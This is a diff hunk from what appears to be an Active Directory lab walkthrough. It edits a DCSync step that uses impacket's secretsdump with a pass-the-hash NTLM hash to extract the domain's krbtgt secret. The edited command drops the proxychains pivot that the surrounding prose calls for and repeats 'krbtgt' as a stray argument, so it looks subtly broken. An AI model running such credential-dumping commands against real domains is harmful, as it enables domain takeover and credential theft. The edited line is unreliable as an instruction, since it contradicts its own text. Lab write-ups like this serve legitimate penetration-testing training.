@@ -110,7 +110,7 @@ Get-NetForestDomain
 Because DCSync requests directory replication over MS-DRSR, run it from the attacker machine through the established SOCKS pivot:
 
 ```bash
-proxychains secretsdump.py 'child.warfare.corp/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user krbtgt
+impacket-secretsdump 'child.warfare.corp/corpmngr@192.168.98.120' -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user krbtgt krbtgt
 
 ```
 
